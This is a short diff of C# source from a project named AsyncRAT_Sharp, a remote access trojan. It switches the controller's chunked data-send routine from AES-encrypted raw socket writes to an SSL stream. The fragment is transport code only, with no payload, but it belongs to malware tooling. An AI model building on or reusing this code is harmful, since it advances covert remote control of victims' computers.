@@ -12,6 +12,7 @@ using System.Threading;
 using System.IO;
 using System.Net.Sockets;
 using Timer = System.Threading.Timer;
+using AsyncRAT_Sharp.Helper;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -55,14 +56,14 @@ namespace AsyncRAT_Sharp.Forms
             {
                 try
                 {
-                    byte[] msg = Settings.AES.Encrypt((byte[])obj);
+                    byte[] msg = (byte[])obj;
                     byte[] buffersize = BitConverter.GetBytes(msg.Length);
                     C.ClientSocket.Poll(-1, SelectMode.SelectWrite);
                     Tick = new Timer(new TimerCallback(Timer3), null, 0, 1000);
-                    C.ClientSocket.Send(buffersize);
+                    C.ClientSslStream.Write(buffersize);
+                    C.ClientSslStream.Flush();
                     int chunkSize = 50 * 1024;
                     byte[] chunk = new byte[chunkSize];
-                    int SendPackage;
                     using (MemoryStream buffereReader = new MemoryStream(msg))
                     {
                         BinaryReader binaryReader = new BinaryReader(buffereReader);
@@ -71,7 +72,8 @@ namespace AsyncRAT_Sharp.Forms
                         {
                             chunk = binaryReader.ReadBytes(chunkSize);
                             bytesToRead -= chunkSize;
-                            SendPackage = C.ClientSocket.Send(chunk);
+                            C.ClientSslStream.Write(chunk);
+                            C.ClientSslStream.Flush();
                             BytesSent += chunk.Length;
                         } while (bytesToRead > 0);
 
